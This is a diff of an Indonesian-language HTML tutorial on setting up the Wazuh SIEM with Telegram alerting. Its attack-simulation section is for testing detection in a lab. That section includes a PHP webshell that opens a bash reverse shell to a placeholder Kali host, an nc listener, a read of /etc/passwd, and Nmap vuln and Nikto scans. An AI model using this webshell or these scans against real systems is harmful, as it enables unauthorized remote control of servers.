-    'text': f"Description: {alert_json['rule'].get('description')}\nLevel: {alert_json['rule'].get('level')}\nAgent: {alert_json['agent'].get('name')}"
+alert_level = alert_json['rule'].get('level', "N/A")
+description = alert_json['rule'].get('description', "N/A")
+agent = alert_json['agent'].get('name', "N/A")
+
+msg_data = {
+  'chat_id': CHAT_ID,
+  'text': f"Description: {description}\nAlert Level: {alert_level}\nAgent: {agent}"
 }
-requests.post(hook_url, json=msg)
+headers = {'content-type': 'application/json'}
+requests.post(hook_url, headers=headers, data=json.dumps(msg_data))
 sys.exit(0)</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Set Permission</strong>
-      <pre><code>sudo chown root:wazuh /var/ossec/integrations/custom-telegram*
+  <li><strong>Atur Permission File</strong>
+    <pre><code>sudo chown root:wazuh /var/ossec/integrations/custom-telegram*
 sudo chmod 750 /var/ossec/integrations/custom-telegram*</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Tambahkan Konfigurasi di <code>ossec.conf</code></strong>
-      <pre><code>&lt;integration&gt;
+  <li><strong>Tambahkan Integrasi di <code>ossec.conf</code></strong>
+    <pre><code>&lt;integration&gt;
   &lt;name&gt;custom-telegram&lt;/name&gt;
   &lt;level&gt;10&lt;/level&gt;
   &lt;hook_url&gt;https://api.telegram.org/bot&lt;API_KEY&gt;/sendMessage&lt;/hook_url&gt;
   &lt;alert_format&gt;json&lt;/alert_format&gt;
 &lt;/integration&gt;</code></pre>
-    </li>
+  </li>
 
-    <li><strong>Restart Wazuh Manager</strong>
-      <pre><code>sudo systemctl restart wazuh-manager</code></pre>
-    </li>
-  </ol>
-</details>
+  <li><strong>Restart Wazuh Manager</strong>
+    <pre><code>sudo systemctl restart wazuh-manager</code></pre>
+  </li>
+</ol>
     <h2>4.4 Simulasi Serangan</h2>
+<p>
+  Untuk menguji integrasi dan deteksi, berikut simulasi serangan umum: webshell, port scanning (Nmap), dan serangan web menggunakan Nikto.
+</p>
 
-<details>
-  <summary><strong>a. Webshell Attack</strong></summary>
-  <p>
-    <strong>Webshell</strong> adalah skrip berbahaya yang diunggah ke server web untuk memberikan akses kendali jarak jauh kepada penyerang. Pada simulasi ini, serangan dilakukan dari Kali Linux ke Ubuntu Agent.
-  </p>
+<h5>a. Webshell Attack</h5>
+<ol>
+  <li>Buat file:
+    <pre><code>touch /var/www/html/webshell-script.php</code></pre>
+  </li>
+  <li>Isi file:
+    <pre><code>echo 'Hello world!' > /var/www/html/webshell-script.php</code></pre>
+  </li>
+  <li>Ganti dengan reverse shell:
+    <pre><code>echo -e "&lt;?php exec('/bin/bash -c \\"bash -i &gt;&amp; /dev/tcp/&lt;KALI_IP&gt;/4444 0&gt;&amp;1\\"');?&gt;" > /var/www/html/webshell-script.php</code></pre>
+  </li>
+  <li>Dari Kali Linux:
+    <pre><code>nc -lvp 4444</code></pre>
+  </li>
+  <li>Akses:
+    <pre><code>http://&lt;UBUNTU_IP&gt;/webshell-script.php</code></pre>
+  </li>
+  <li>Lihat alert di dashboard Wazuh:</li>
+  <img src="./webshell.png" class="img-fluid" alt="Webshell Alert" />
 
-  <ol>
-    <li>Buat file skrip:
-      <pre><code>touch /var/www/html/webshell-script.php</code></pre>
-    </li>
-    <li>Isi file dengan konten sederhana:
-      <pre><code>echo 'Hello world!' > /var/www/html/webshell-script.php</code></pre>
-    </li>
-    <li>Ganti dengan skrip reverse shell:
-      <pre><code>echo -e "&lt;?php exec('/bin/bash -c \\"bash -i &gt;&amp; /dev/tcp/&lt;KALI_IP&gt;/4444 0&gt;&amp;1\\"');?&gt;" &gt; /var/www/html/webshell-script.php</code></pre>
-    </li>
-    <li>Dari Kali Linux, jalankan listener:
-      <pre><code>nc -lvp 4444</code></pre>
-    </li>
-    <li>Akses melalui browser:
-      <pre><code>http://&lt;UBUNTU_IP&gt;/webshell-script.php</code></pre>
-    </li>
-    <li>Koneksi akan terbentuk di Kali Linux, jalankan perintah seperti:
-      <pre><code>whoami
-cat /etc/passwd</code></pre>
-    </li>
-    <li>Cek dasbor Wazuh:
-      <img src="./webshell.png" alt="Alert Webshell Wazuh" style="max-width:100%; margin-top:1rem; border:1px solid #ddd; border-radius:6px;" />
-    </li>
-  </ol>
-</details>
+</ol>
 
-<details>
-  <summary><strong>b. Nmap Scan</strong></summary>
-  <p>
-    <strong>Nmap</strong> digunakan untuk melakukan pemindaian terhadap endpoint Ubuntu Agent dari Kali Linux.
-  </p>
+<h5>b. Nmap Scan</h5>
+<ol>
+  <li>Jalankan dari Kali Linux:
+    <pre><code>sudo nmap -sS --script=vuln &lt;AGENT_IP&gt;</code></pre>
+  </li>
+  <li>IP akan diblokir otomatis oleh active-response Wazuh selama 3 menit</li>
+  <li>Lihat alert di dashboard:</li>
+  <img src="./nmap.png" class="img-fluid" alt="Nmap Scan Alert" />
+</ol>
 
-  <pre><code>sudo nmap -sS --script=vuln &lt;AGENT_IP&gt;</code></pre>
+<h5>c. Web Attack (Nikto)</h5>
+<ol>
+  <li>Jalankan:
+    <pre><code>nikto -h http://&lt;AGENT_IP&gt;/</code></pre>
+  </li>
+  <li>Log akan dianalisis oleh Wazuh atau Teler</li>
+  <li>Lihat alert web attack:</li>
+  <img src="./webattack.png" class="img-fluid" alt="Web Attack Alert" />
+</ol>
+    <!-- ========== Tambahan untuk konfigurasi, Teler, Suricata, Telegram, dan Simulasi ========== -->
+    <!-- Saya akan tempelkan bagian lanjutannya ke sini -->
 
-  <p>
-    Serangan ini akan memicu <strong>active response</strong> dari Wazuh berupa perintah <code>firewall-drop</code> untuk memblokir IP selama 180 detik.
-  </p>
+  </div>
 
-  <img src="./nmap.png" alt="Alert Nmap Wazuh" style="max-width:100%; margin-top:1rem; border:1px solid #ddd; border-radius:6px;" />
-</details>
+  <footer class="text-center text-muted mt-5 mb-3">
+    &copy; 2025 Panduan Wazuh SIEM
+  </footer>
 
-<details>
-  <summary><strong>c. Web Attack (Nikto)</strong></summary>
-  <p>
-    Gunakan <strong>Nikto</strong> dari Kali Linux untuk menyerang web server yang rentan:
-  </p>
-
-  <pre><code>nikto -h http://&lt;AGENT_IP&gt;/</code></pre>
-
-  <p>
-    Setelah serangan, Wazuh akan menganalisis log dari server dan menghasilkan alert berdasarkan rule default atau dari integrasi Teler.
-  </p>
-
-  <img src="./webattack.png" alt="Alert Web Attack Wazuh" style="max-width:100%; margin-top:1rem; border:1px solid #ddd; border-radius:6px;" />
-</details>
-
-  </main>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
